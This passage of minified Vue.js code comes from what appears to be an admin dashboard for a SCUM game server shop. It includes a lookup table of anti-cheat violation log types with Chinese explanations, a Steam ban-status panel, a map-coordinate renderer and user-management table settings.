violation-PrisonerActionLootCorpseDescription",label:"玩家角色动作异常(摸尸体)",desc:"可能是网络问题，短时间内多次出现可怀疑使用加速、灵魂出窍等外挂",color:"green"},{value:"Request character action violation-PrisonerActionEatItemDescription",label:"玩家角色动作异常(进食)",desc:"可能是网络问题，短时间内多次出现可怀疑使用加速、灵魂出窍等外挂",color:"green"},{value:"Request character action violation-PrisonerActionAddWeaponAttachmentDescription",label:"玩家角色动作异常(添加武器附件)",desc:"可能是网络问题，短时间内多次出现可怀疑使用加速、灵魂出窍等外挂",color:"green"},{value:"Request character action violation-PrisonerActionCheckWeaponAmmoDescription",label:"玩家角色动作异常(检查武器子弹)",desc:"可能是网络问题，短时间内多次出现可怀疑使用加速、灵魂出窍等外挂",color:"green"},{value:"Request character action violation-PrisonerActionLoadAmmoIntoMagazineDescription",label:"玩家角色动作异常(装弹)",desc:"可能是网络问题，短时间内多次出现可怀疑使用加速、灵魂出窍等外挂",color:"green"},{value:"Request character action violation-PrisonerActionReloadWeaponDescription",label:"玩家角色动作异常(武器上弹)",desc:"可能是网络问题，短时间内多次出现可怀疑使用加速、灵魂出窍等外挂",color:"green"},{value:"Request character action violation-PrisonerActionClearWeaponMalfunctionDescription",label:"玩家角色动作异常(排除武器卡壳)",desc:"可能是网络问题，短时间内多次出现可怀疑使用加速、灵魂出窍等外挂",color:"green"},{value:"Request character action violation-PrisonerActionChangeWeaponFiringModeDescription",label:"玩家角色动作异常(切换武器连发单发)",desc:"可能是网络问题，短时间内多次出现可怀疑使用加速、灵魂出窍等外挂",color:"green"},{value:"Request character action violation-PrisonerActionCheckWeaponFiringModeDescription",label:"玩家角色动作异常(检查武器连发单发)",desc:"可能是网络问题，短时间内多次出现可怀疑使用加速、灵魂出窍等外挂",color:"green"},{value:"Request character action violation-PrisonerActionChangeWeaponFiringModeModeDescription",label:"[新]玩家角色动作异常(检查武器连发单发)",desc:"可能是网络问题，短时间内多次出现可怀疑使用加速、灵魂出窍等外挂",color:"green"},{value:"Request character action violation-PrisonerActionTakeItemInHandsDescription",label:"玩家角色动作异常(往手上放东西)",desc:"可能是网络问题，短时间内多次出现可怀疑使用加速、灵魂出窍等外挂或者是利用游戏物品复制的bug",color:"orange"},{value:"Request character action violation-PrisonerActionRemoveItemFromHandsDescription",label:"玩家角色动作异常(把物品从手中丢出)",desc:"可能是网络问题，短时间内多次出现可怀疑使用加速、灵魂出窍等外挂",color:"orange"},{value:"Request character action violation-PrisonerActionEnterVehicleDescription",label:"玩家角色动作异常(玩家进入载具)",desc:"可能是网络问题，短时间内多次出现可怀疑使用加速、灵魂出窍等外挂",color:"orange"},{value:"Request character action violation-PrisonerActionOpenOrCloseVehicleDoorDescription",label:"玩家角色动作异常(玩家开关载具门)",desc:"可能是网络问题，短时间内多次出现可怀疑使用加速、灵魂出窍等外挂",color:"orange"},{value:"Request character action violation-PrisonerActionChangeVehicleWeaponAimingStanceDescription",label:"玩家角色动作异常(玩家在载具中改变瞄准姿态)",desc:"可能是网络问题，短时间内多次出现可怀疑使用加速、灵魂出窍等外挂",color:"orange"},{value:"Request character action violation-PrisonerActionChainForExitingVehicleDescription",label:"玩家角色动作异常(玩家离开载具的动作链)",desc:"可能是网络问题，短时间内多次出现可怀疑使用加速、灵魂出窍等外挂",color:"orange"},{value:"Request character action violation-PrisonerActionSwitchVehicleSeatDescription",label:"玩家角色动作异常(玩家在载具中更换座位)",desc:"可能是网络问题，短时间内多次出现可怀疑使用加速、灵魂出窍等外挂",color:"orange"},{value:"Request character action violation-PrisonerActionTriggerRemoteKeyDescription",label:"玩家角色动作异常(玩家触发远程物品的Key)",desc:"可能是网络问题，短时间内多次出现可怀疑使用加速、灵魂出窍等外挂",color:"orange"},{value:"Request character action violation-PrisonerActionUncraftItemDescription",label:"玩家角色动作异常(玩家撤销手工制造物品)",desc:"可能是网络问题，短时间内多次出现可怀疑使用加速、灵魂出窍等外挂",color:"orange"},{value:"Request character action violation-PrisonerActionThrowItemDescription",label:"玩家角色动作异常(玩家扔出物品)",desc:"可能是网络问题，短时间内多次出现可怀疑使用加速、灵魂出窍等外挂",color:"orange"},{value:"Request character action violation-PrisonerActionSearchGroundDescription",label:"玩家角色动作异常(玩家搜索地面)",desc:"可能是网络问题，短时间内多次出现可怀疑使用加速、灵魂出窍等外挂",color:"green"},{value:"Request character action violation-PrisonerActionSearchObjectDescription",label:"玩家角色动作异常(玩家搜索物品)",desc:"可能是网络问题，短时间内多次出现可怀疑使用加速、灵魂出窍等外挂",color:"orange"},{value:"Request character action violation-PrisonerActionCutObjectDescription",label:"玩家角色动作异常(玩家切物品)",desc:"可能是网络问题，短时间内多次出现可怀疑使用加速、灵魂出窍等外挂",color:"green"},{value:"Request character action violation-PrisonerActionCraftItemDescription",label:"玩家角色动作异常(玩家制造物品)",desc:"可能是网络问题，短时间内多次出现可怀疑使用加速、灵魂出窍等外挂",color:"green"},{value:"Request character action violation-PrisonerActionDestroyItemDescription",label:"玩家角色动作异常(玩家毁坏物品)",desc:"可能是网络问题，短时间内多次出现可怀疑使用加速、灵魂出窍等外挂",color:"orange"},{value:"Request character action violation-PrisonerActionChopBaseElementDescription",label:"玩家角色动作异常(玩家毁坏基建物品)",desc:"可能是网络问题，短时间内多次出现可怀疑使用加速、灵魂出窍等外挂",color:"orange"},{value:"Request character action violation-PrisonerActionOpenItemDescription",label:"玩家角色动作异常(玩家打开物品)",desc:"可能是网络问题，短时间内多次出现可怀疑使用加速、灵魂出窍等外挂",color:"orange"},{value:"Request character action violation-PrisonerActionForceUnlockDescription",label:"玩家角色动作异常(玩家强制解锁)",desc:"可能是网络问题，短时间内多次出现可怀疑使用加速、灵魂出窍等外挂",color:"orange"},{value:"OutOfInteractionRangeViolation-Add item to inventory violation",label:"超出玩家角色交互范围(添加物品到容器)",desc:"可能是网络问题，短时间内多次出现可怀疑使用加速、灵魂出窍等外挂",color:"green"},{value:"OutOfInteractionRangeViolation-Light item interact violation",label:"超出玩家角色交互范围(高亮附近贵重资源)",desc:"可能是网络问题，短时间内多次出现可怀疑使用加速、灵魂出窍等外挂",color:"green"},{value:"OutOfInteractionRangeViolation-Equip clothes item violation",label:"超出玩家角色交互范围(装备、衣物、物品违规)",desc:"可能是网络问题，短时间内多次出现可怀疑使用加速、灵魂出窍等外挂",color:"green"},{value:"Equip clothes item violation",label:"装备、衣物、物品违规",desc:"可能是网络问题，短时间内多次出现可怀疑使用加速、灵魂出窍等外挂",color:"orange"},{value:"MeeleDamageLocationsMismatch",label:"伤害结算时的坐标位置异常",desc:"可能是网络问题，短时间内多次出现可怀疑使用加速、灵魂出窍、透视等外挂",color:"orange"},{value:"Auto add item violation",label:"物品自动添加异常",desc:"可能是网络问题，短时间内多次出现可怀疑使用加速、灵魂出窍等外挂或者是利用游戏物品复制的bug",color:"orange"},{value:"Take damage violation",label:"玩家伤害计算异常",desc:"可能是网络问题或其他情况",color:"orange"},{value:"AmmoCountViolation",label:"子弹数量异常",desc:"玩家使用武器的时候检测出异常，可能是网络问题，短时间内多次出现可怀疑使用无限子弹等外挂",color:"orange"},{value:"AmmoCountMismatch",label:"子弹数量不匹配",desc:"玩家使用武器的时候检测出异常，可能是网络问题，短时间内多次出现可怀疑使用无限子弹等外挂",color:"orange"},{value:"GodModeFillViolation",label:"检测到使用一键建造的嫌疑",desc:"玩家填充图纸的时候检测出异常，可能是网络问题，短时间内多次出现可怀疑使用秒建等外挂",color:"orange"},{value:"Add item to inventory violation",label:"添加物品到容器",desc:"可能是网络问题，短时间内多次出现可怀疑使用加速、灵魂出窍等外挂",color:"green"},{value:"FalseTrapTriggerViolation",label:"意外的陷阱触发",desc:"玩家意外触发了陷阱(可能人根本不在原地)，可能是网络问题，短时间内多次出现可怀疑使用加速、灵魂出窍等外挂",color:"orange"},{value:"illegalLockpick",label:"异常撬锁记录",desc:"玩家在服务器不允许撬锁的地方撬锁，可能是管理员行为，否则可以怀疑使用了撬锁外挂",color:"red"},{value:"ProjectileDamageLocationsMismatch",label:"伤害记录坐标不匹配",desc:"可能是网络问题或其他情况",color:"orange"},{value:"",label:"(无类型)",desc:"无法识别的违规记录，如果大量出现可以联系作者",color:"grey"}];var U=i("bbbb"),N=i("8eed"),M=i.n(N),z=i("5e38"),O=i.n(z),q={name:"editoritem",data:function(){return{editor:null,info_:null}},mounted:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:e.setEditor(e.value,e.disabled,e.placeholder);case 1:case"end":return t.stop()}}),t)})))()},methods:{setEditor:function(e,t,i){var a=this;this.editor=new M.a(this.$refs.editor),this.$nextTick((function(){a.editor.config.uploadImgShowBase64=!0,a.editor.config.pasteIgnoreImg=!1,a.editor.config.menus=["head","bold","fontSize","fontName","italic","underline","strikeThrough","foreColor","backColor","link","list","justify","quote","emoticon","image","video","table","splitLine","undo","redo"],a.editor.config.placeholder=i,a.editor.config.onchange=function(e){a.info_=O()(e),a.$emit("change",e),a.$emit("input",e)},a.editor.create(),"string"==typeof e&&a.editor.txt.html(e),!0===t?a.editor.disable():a.editor.enable()}))}},computed:{},watch:{disabled:function(e){!0===e?this.editor.disable():this.editor.enable()},value:function(e){e!==this.editor.txt.html()&&this.editor.txt.html(this.value)}},components:{},model:{prop:"value",event:"change"},props:{value:{type:String,default:""},disabled:{type:Boolean,default:!1},placeholder:{type:String,default:""}}},B=q,H=(i("9d06"),Object(S.a)(B,(function(){var e=this.$createElement,t=this._self._c||e;return t("div",{staticClass:"editor",attrs:{name:"editoritem"}},[t("div",{ref:"editor",staticClass:"text"})])}),[],!1,null,null,null)),j=H.exports,Y={name:"Liker",props:{scumBanId:{type:String,default:null},likeCount:{type:Number,default:0},dislikeCount:{type:Number,default:0},selfRemark:{type:Number,default:0}},mounted:function(){},data:function(){return{}},methods:{onSubmitRemark:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return i.prev=0,i.next=3,f({method:"POST",url:"/scumBan/giveScumBanRemark",data:{scumBanId:t.scumBanId,remark:e}});case 3:200===i.sent.status&&(t.$message.success("谢谢评价"),t.$emit("refresh")),i.next=10;break;case 7:i.prev=7,i.t0=i.catch(0),console.error(i.t0);case 10:case"end":return i.stop()}}),i,null,[[0,7]])})))()}}},G=Y,K=Object(S.a)(G,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{padding:"0 10px"}},[i("a-tooltip",{attrs:{title:"可信"}},[i("span",{staticStyle:{cursor:"pointer"},on:{click:function(){return e.onSubmitRemark(0===e.selfRemark?void 0:0)}}},[0===e.selfRemark?i("a-icon",{staticStyle:{"font-size":"16px"},attrs:{type:"like",theme:"twoTone"}}):i("a-icon",{staticStyle:{"font-size":"16px"},attrs:{type:"like",theme:"filled"}}),i("span",{staticStyle:{"font-weight":"bolder","margin-left":"5px"},style:{color:0===e.selfRemark?"#1890ff":"black"}},[e._v(e._s(e.likeCount))])],1)]),i("a-tooltip",{attrs:{title:"不可信"}},[i("span",{staticStyle:{cursor:"pointer"},on:{click:function(){return e.onSubmitRemark(1===e.selfRemark?void 0:1)}}},[1===e.selfRemark?i("a-icon",{staticStyle:{"margin-left":"10px","font-size":"16px"},attrs:{type:"dislike",theme:"twoTone",twoToneColor:"#ff4d4f"}}):i("a-icon",{staticStyle:{"margin-left":"10px","font-size":"16px"},attrs:{type:"dislike",theme:"filled"}}),i("span",{staticStyle:{"font-weight":"bolder","margin-left":"5px"},style:{color:1===e.selfRemark?"#ff4d4f":"black"}},[e._v(e._s(e.dislikeCount))])],1)])],1)}),[],!1,null,"619c5eef",null),V=K.exports,X=i("3835"),Z=(i("cb29"),{name:"MapLocations",props:{locations:{type:String},width:{type:Number},height:{type:Number}},computed:Object(s.a)(Object(s.a)({},Object(v.mapState)(["scumMapBorder","scumMapImageObject"])),{},{combineAll:function(){return[this.locations,this.scumMapBorder,this.scumMapImageObject]}}),data:function(){return{showWholeMap:!1}},methods:{drawMap:function(e,t,i){var a=this;return Object(o.a)(regeneratorRuntime.mark((function n(){var r,o,s,l,c,d,u,p,m,g;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:return r=e.split(","),o=Object(X.a)(r,2),s=o[0],l=o[1],n.next=3,new Promise((function(e){var t=setInterval((function(){void 0!==a.$refs["map-locations"]&&(clearInterval(t),e())}),100)}));case 3:c=a.$refs["map-locations"],d=c.getContext("2d"),c.width=a.width||180,c.height=a.height||150,u=i.width*((t.xMax-s)/(t.xMax-t.xMin))-.075*i.width,p=i.width*((t.xMax-s)/(t.xMax-t.xMin))+.075*i.width,m=i.height*((t.yMax-l)/(t.yMax-t.yMin))-.075*i.height*(a.height||150)/(a.width||180),g=i.height*((t.yMax-l)/(t.yMax-t.yMin))+.075*i.height*(a.height||150)/(a.width||180),d.drawImage(a.scumMapImageObject,u,m,p-u,g-m,0,0,a.width||150,a.height||120),d.globalAlpha=.15,d.fillStyle="red",d.beginPath(),d.arc((a.width||180)/2,(a.height||150)/2,.23*(a.width||180),2*Math.PI,0,!0),d.closePath(),d.fill(),d.globalAlpha=.45,d.fillStyle="red",d.beginPath(),d.arc((a.width||180)/2,(a.height||150)/2,.07*(a.width||180),2*Math.PI,0,!0),d.closePath(),d.fill();case 24:case"end":return n.stop()}}),n)})))()},drawMapLarge:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a,n,r,o,s,l,c,d,u,p,m,g,h;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:if(i=e.combineAll[0],a=e.combineAll[1],n=e.combineAll[2],r=3===i.split(",").length&&void 0===i.split(",").find((function(e){return!("string"==typeof e&&!isNaN(parseFloat(e)))})),o="number"==typeof a.xMax&&"number"==typeof a.xMin&&"number"==typeof a.yMax&&"number"==typeof a.yMin,s=n instanceof Image,r&&o&&s){t.next=8;break}return t.abrupt("return");case 8:return l=i.split(","),c=Object(X.a)(l,2),d=c[0],u=c[1],t.next=11,new Promise((function(t){var i=setInterval((function(){void 0!==e.$refs["map-locations"]&&(clearInterval(i),t())}),100)}));case 11:p=e.$refs["map-locations-large"],m=p.getContext("2d"),p.width=800,p.height=800,g=(a.xMax-d)/(a.xMax-a.xMin)*800,h=(a.yMax-u)/(a.yMax-a.yMin)*800,m.drawImage(e.scumMapImageObject,0,0,n.width,n.height,0,0,800,800),m.globalAlpha=.15,m.fillStyle="red",m.beginPath(),m.arc(g,h,30,2*Math.PI,0,!0),m.closePath(),m.fill(),m.globalAlpha=.45,m.fillStyle="red",m.beginPath(),m.arc(g,h,10,2*Math.PI,0,!0),m.closePath(),m.fill();case 30:case"end":return t.stop()}}),t)})))()}},watch:{combineAll:{immediate:!0,deep:!0,handler:function(e){var t=e[0],i=e[1],a=e[2],n=3===t.split(",").length&&void 0===t.split(",").find((function(e){return!("string"==typeof e&&!isNaN(parseFloat(e)))})),r="number"==typeof i.xMax&&"number"==typeof i.xMin&&"number"==typeof i.yMax&&"number"==typeof i.yMin,o=a instanceof Image;n&&r&&o&&this.drawMap(t,i,a)}}}}),W=Z,Q=(i("9896"),Object(S.a)(W,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{style:{width:(e.width||180)+"px",height:(e.height||150)+"px"}},[i("a-modal",{attrs:{centered:"",closable:!1,footer:null,header:!1,width:810},on:{close:function(t){e.showWholeMap=!1}},model:{value:e.showWholeMap,callback:function(t){e.showWholeMap=t},expression:"showWholeMap"}},[i("canvas",{ref:"map-locations-large",staticStyle:{width:"800px",height:"800px"}})]),i("canvas",{ref:"map-locations",style:{width:(e.width||180)+"px",height:(e.height||150)+"px"},on:{click:function(){e.showWholeMap=!0,e.drawMapLarge()}}})],1)}),[],!1,null,"7cf69b78",null)),J=Q.exports,ee={name:"SteamInfo",components:{},props:{steamInfo:{type:Object,default:function(){return{}}}},computed:{},data:function(){return{window:window,moment:R.a,cloneDeep:A.cloneDeep}},mounted:function(){},methods:{}},te=ee,ie=Object(S.a)(te,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"auto",height:"auto"}},[null!==e.steamInfo.status?i("a-alert",{staticStyle:{"margin-bottom":"10px"},attrs:{"show-icon":"",message:e.steamInfo.status,type:"info"}}):i("div",{staticStyle:{border:"1px #A0A0A0 solid","border-radius":"10px",padding:"10px"}},[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("Steam账户基本信息")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%","padding-left":"10px","margin-bottom":"5px"}},[i("div",{staticStyle:{width:"100%",height:"60px"}},[i("div",{staticStyle:{width:"60px",height:"60px",display:"inline-block","vertical-align":"top"}},[i("img",{staticStyle:{width:"58px",height:"58px",border:"2px grey solid","border-radius":"5px"},attrs:{src:e.steamInfo.avatarFull}})]),i("div",{staticStyle:{width:"calc(100% - 60px)",height:"60px",display:"inline-block","vertical-align":"top","padding-left":"5px"}},[i("div",{staticStyle:{width:"100%",height:"40px","line-height":"40px","font-size":"20px",color:"orange"}},[i("strong",[e._v(e._s(e.steamInfo.personaname))]),i("a-button",{staticStyle:{"margin-left":"10px",transform:"translateY(-2px)"},attrs:{size:"small"},on:{click:function(){e.window.open(e.steamInfo.profileUrl,"_blank")}}},[e._v("前往Steam个人主页")])],1),i("div",{staticStyle:{width:"100%",height:"12px","line-height":"12px","font-size":"12px"}},[i("strong",[e._v(e._s(e.steamInfo.steamId))])])])]),i("div",{staticStyle:{width:"100%",height:"30px","line-height":"30px"}},[i("span",[e._v("Steam用户等级:")]),i("strong",{staticStyle:{"margin-left":"10px",color:"#1890ff"}},[e._v("Lv. "+e._s(e.steamInfo.playerLevel))])]),i("div",{staticStyle:{width:"100%",height:"30px","line-height":"30px"}},[i("span",[e._v("Steam账号注册日期:")]),i("strong",{staticStyle:{"margin-left":"10px"}},[e._v(e._s(e.steamInfo.timeCreated?e.moment(parseInt(e.steamInfo.timeCreated)).format("YYYY-MM-DD HH:mm:ss"):"-"))])])]),i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("SCUM游戏信息")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%","padding-left":"10px","margin-bottom":"5px"}},[i("div",{staticStyle:{width:"100%",height:"30px","line-height":"30px"}},[i("span",[e._v("SCUM游戏时长:")]),i("strong",{staticStyle:{"margin-left":"10px"}},[e._v(e._s(e.steamInfo.playHours)+" 分钟 / "+e._s(e.steamInfo.playHours/60)+" 小时")])]),i("div",{staticStyle:{width:"100%",height:"30px","line-height":"30px"}},[i("span",[e._v("上次登录游戏时间:")]),i("strong",{staticStyle:{"margin-left":"10px"}},[e._v(e._s(e.steamInfo.lastPlayTime?e.moment(parseInt(e.steamInfo.lastPlayTime)).format("YYYY-MM-DD HH:mm:ss"):"-"))])])]),i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("封禁信息")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%","padding-left":"10px","margin-bottom":"5px"}},[i("div",{staticStyle:{width:"100%",height:"30px","line-height":"30px"}},[i("span",[e._v("VAC封禁:")]),i("strong",{staticStyle:{"margin-left":"10px"},style:{color:!0===e.steamInfo.vacBanned?"red":"grey"}},[e._v(e._s(!0===e.steamInfo.vacBanned?"是":"否"))])]),i("div",{staticStyle:{width:"100%",height:"30px","line-height":"30px"}},[i("span",[e._v("Steam社区封禁:")]),i("strong",{staticStyle:{"margin-left":"10px"},style:{color:!0===e.steamInfo.communityBanned?"red":"grey"}},[e._v(e._s(!0===e.steamInfo.communityBanned?"是":"否"))])]),i("div",{staticStyle:{width:"100%",height:"30px","line-height":"30px"}},[i("span",[e._v("Steam支付问题封禁:")]),i("strong",{staticStyle:{"margin-left":"10px"},style:{color:"none"!==e.steamInfo.economyBan?"red":"grey"}},[e._v(e._s("none"!==e.steamInfo.economyBan?"是":"否"))])]),i("div",{staticStyle:{width:"100%",height:"30px","line-height":"30px"}},[i("span",[e._v("被VAC封禁的次数:")]),i("strong",{staticStyle:{"margin-left":"10px"},style:{color:e.steamInfo.numberOfVACBans>0?"red":"grey"}},[e._v(e._s(e.steamInfo.numberOfVACBans))])]),i("div",{staticStyle:{width:"100%",height:"30px","line-height":"30px"}},[i("span",[e._v("被封禁的游戏个数:")]),i("strong",{staticStyle:{"margin-left":"10px"},style:{color:e.steamInfo.numberOfGameBans>0?"red":"grey"}},[e._v(e._s(e.steamInfo.numberOfGameBans))])]),i("div",{staticStyle:{width:"100%",height:"30px","line-height":"30px"}},[i("span",[e._v("最近一次被封禁到现在为止的天数:")]),i("strong",{staticStyle:{"margin-left":"10px"}},[e._v(e._s(e.steamInfo.daysSinceLastBan)+" 天")])])])],1)],1)}),[],!1,null,"d8e8a7f0",null),ae=ie.exports,ne=["id","userId","createdTimeStamp","userDollar","lastCheckInTimeStamp","configs"],re=["id","userId","dollars","levelExpireTimeStamp","militaryLevelExpireTimeStamp","updateTimeStamp"],oe={name:"UserTableExpand",components:{Liker:V,Loading:w,Editor:j,MapLocations:J,SteamInfo:ae},computed:Object(s.a)({},Object(v.mapState)(["userInfo"])),props:{userId:{type:Number,default:null},userSteamId:{type:String,default:null},levelList:{type:Array,default:function(){return[]}},levelDetailList:{type:Array,default:function(){return[]}},militaryLevelList:{type:Array,default:function(){return[]}},readOnly:{type:Boolean,default:!1},thirdPartyRobotUidConfigs:{type:Array,default:function(){return[]}}},data:function(){var e=this;return{moment:R.a,eachKeyValues:{second:"秒",minute:"分钟",hour:"小时",day:"每日(24小时)",day_start:"每日(0时起)",week:"每周(7天)",week_start:"每周(周一起)",month:"每月(30天)",month_start:"每月(1号起)",once:"永远"},purchaseLimitEachKeyValue:{second:"每秒",minute:"每分钟",hour:"每小时",day:"每日(24小时)",day_start:"每日(0时起)",week:"每周(7天)",week_start:"每周(周一起)",month:"每月(30天)",month_start:"每月(1号起)",once:"永久"},userNewGiftStatusList:{unexclaimed:"未领取",exclaimed:"已领取"},userNewGiftStatusBadgeKeyValue:{unexclaimed:"default",exclaimed:"success"},notificationStatusList:{unread:"未读",read:"已读"},notificationStatusBadgeKeyValue:{unread:"default",read:"success"},currentExpandKey:null,currentExpandedUserId:"",currentUserScumBan:{loading:!1,expandedScumBanIds:[],columns:[{title:"提交服务器",key:"reportSource",dataIndex:"reportSource",width:100,align:"center",scopedSlots:{customRender:"reportSource"}},{title:"商城用户名",key:"userName",dataIndex:"userName",width:160,align:"center",scopedSlots:{customRender:"userName"}},{title:"SCUM服务器ID",key:"scumId",dataIndex:"scumId",width:160,align:"center",scopedSlots:{customRender:"scumId"}},{title:"提交时间",key:"createdTimeStamp",dataIndex:"createdTimeStamp",width:180,align:"center",scopedSlots:{customRender:"createdTimeStamp"}}],userScumBanList:[],userScumBanListPagination:{pageNum:1,pageSize:10,total:0},steamInfo:{status:null,steamId:"",personaname:"",avatarFull:"",profileUrl:"",timeCreated:0,playerLevel:1,lastPlayTime:0,playHours:0,vacBanned:!1,communityBanned:!1,economyBan:"none",numberOfVACBans:0,numberOfGameBans:0,daysSinceLastBan:0}},currentUserInfo:{edit:!1,loading:!1,saveLoading:!1,editForm:{userName:null,email:null,phone:null,steamId:null,status:null,hasBoughtWelcomepack:null,buyWelcomeDidiCarTime:null,countLoginMinites:null},form:{userName:null,email:null,phone:null,steamId:null,status:null,hasBoughtWelcomepack:null,buyWelcomeDidiCarTime:null},configs:{}},currentUserPassword:{saveLoading:!1},currentUserDollar:{edit:!1,loading:!1,saveLoading:!1,editForm:{type:"absolute",relativeType:"plus",relative:0,dollars:null,chargeDollars:null,level:null,levelExpireTimeStamp:null,gesture:null,militaryLevelId:null,militaryLevelExpireTimeStamp:null},form:{type:"absolute",relativeType:"plus",relative:0,dollars:null,chargeDollars:null,level:null,levelExpireTimeStamp:null,gesture:null,militaryLevelId:null,militaryLevelExpireTimeStamp:null}},currentUserNewGift:{loading:!1,fromTimeStamp:void 0,columns:[{title:"天数",key:"day",dataIndex:"day",width:80,align:"center",scopedSlots:{customRender:"day"}},{title:"领取状态",key:"status",dataIndex:"status",width:120,align:"center",scopedSlots:{customRender:"status"}},{title:"领取时间",key:"exclaimTimeStamp",dataIndex:"exclaimTimeStamp",width:150,align:"center",scopedSlots:{customRender:"exclaimTimeStamp"}},{title:"关联订单信息",key:"buyId",dataIndex:"buyId",width:100,align:"center",scopedSlots:{customRender:"buyId"}}],currentUserNewGiftList:[]},currentUserAchieveGift:{loading:!1,columns:[{title:"成就ID",key:"currentGiftId",dataIndex:"currentGiftId",width:80,align:"center",scopedSlots:{customRender:"currentGiftId"}},{title:"成就名称",key:"currentGiftName",dataIndex:"currentGiftName",width:150,align:"center",scopedSlots:{customRender:"currentGiftName"}},{title:"兑换时间",key:"createdTimeStamp",dataIndex:"createdTimeStamp",width:150,align:"center",scopedSlots:{customRender:"createdTimeStamp"}},{title:"关联消息队列信息",key:"buyId",dataIndex:"buyId",width:100,align:"center",scopedSlots:{customRender:"buyId"}},{title:"操作",key:"controls",dataIndex:"controls",width:120,align:"center",fix:"right",scopedSlots:{customRender:"controls"}}],userAchieveGiftList:[],userAchieveGiftListPagination:{pageNum:1,pageSize:10,total:0}},currentUserLocations:{loading:!1,editor:{show:!1,saveLoading:!1,new:null,index:null,id:null,data:{locations:null,description:null,configs:{price:null,purchaseLimitOn:!1,time:0,each:""}}},columns:[{title:"坐标",key:"locations",dataIndex:"locations",width:200,align:"center",scopedSlots:{customRender:"locations"}},{title:"描述说明",key:"description",dataIndex:"description",width:200,align:"center",scopedSlots:{customRender:"description"}},{title:"指定价格",key:"price",dataIndex:"price",width:100,align:"center",scopedSlots:{customRender:"price"}},{title:"指定购买限制",key:"purchaseLimit",dataIndex:"purchaseLimit",width:150,align:"center",scopedSlots:{customRender:"purchaseLimit"}},{title:"操作",key:"controls",dataIndex:"controls",width:180,align:"center",scopedSlots:{customRender:"controls"}}],userMonitorsList:[]},currentUserMonitors:{loading:!1,editor:{show:!1,saveLoading:!1,new:null,index:null,id:null,data:{locations:null,description:null,configs:{price:null,purchaseLimitOn:!1,time:0,each:""}}},columns:[{title:"坐标",key:"locations",dataIndex:"locations",width:200,align:"center",scopedSlots:{customRender:"locations"}},{title:"描述说明",key:"description",dataIndex:"description",width:200,align:"center",scopedSlots:{customRender:"description"}},{title:"指定价格",key:"price",dataIndex:"price",width:100,align:"center",scopedSlots:{customRender:"price"}},{title:"指定购买限制",key:"purchaseLimit",dataIndex:"purchaseLimit",width:150,align:"center",scopedSlots:{customRender:"purchaseLimit"}},{title:"操作",key:"controls",dataIndex:"controls",width:180,align:"center",scopedSlots:{customRender:"controls"}}],userLocationsList:[]},currentUserDollarChange:{loading:!1,columns:[{title:"变动金额",key:"balance",dataIndex:"balance",width:100,align:"center",scopedSlots:{customRender:"balance"}},{title:"变动原因",key:"reason",dataIndex:"reason",width:300,align:"center",scopedSlots:{customRender:"reason"}},{title:"发生时间",key:"createdTimeStamp",dataIndex:"createdTimeStamp",width:180,align:"center",scopedSlots:{customRender:"createdTimeStamp"}}],userDollarChangeList:[],userDollarChangeListPagination:{pageNum:1,pageSize:10,total:0}},currentUserLogin:{loading:!1,columns:[{title:"Steam ID",key:"steamId",dataIndex:"steamId",width:150,align:"center",scopedSlots:{customRender:"steamId"}},{title:"SCUM玩家名称",key:"scumId",dataIndex:"scumId",width:160,align:"center",scopedSlots:{customRender:"scumId"}},{title:"登录时间",key:"loginTimeStamp",dataIndex:"loginTimeStamp",width:150,align:"center",scopedSlots:{customRender:"loginTimeStamp"}},{title:"登出时间",key:"logoutTimeStamp",dataIndex:"logoutTimeStamp",width:150,align:"center",scopedSlots:{customRender:"logoutTimeStamp"}},{title:"登录状态",key:"status",dataIndex:"status",width:80,align:"center",scopedSlots:{customRender:"status"}},{title:"玩家登录IP地址",key:"loginIp",dataIndex:"loginIp",width:150,align:"center",scopedSlots:{customRender:"loginIp"}},{title:"Session ID",key:"sessionId",dataIndex:"sessionId",width:90,align:"center",scopedSlots:{customRender:"sessionId"}}],currentUserLoginList:[],userLoginListPagination:{pageNum:1,pageSize:10,total:0},expandedUserLoginIds:[]},currentUserNotification:{loading:!1,columns:[{title:"消息内容",key:"content",dataIndex:"content",width:250,align:"center",scopedSlots:{customRender:"content"}},{title:"阅读状态",key:"status",dataIndex:"status",width:80,align:"center",scopedSlots:{customRender:"status"}},{title:"创建时间",key:"createdTimeStamp",dataIndex:"createdTimeStamp",width:150,align:"center",scopedSlots:{customRender:"createdTimeStamp"}}],currentUserNotificationList:[],userNotificationListPagination:{pageNum:1,pageSize:10,total:0},expandedUserNotificationIds:[]},userInfoRules:{userName:[{required:!0,trigger:"change",message:"请输入用户昵称",validator:function(e,t,i){t&&t.length>0&&t.length<=50?i():i(new 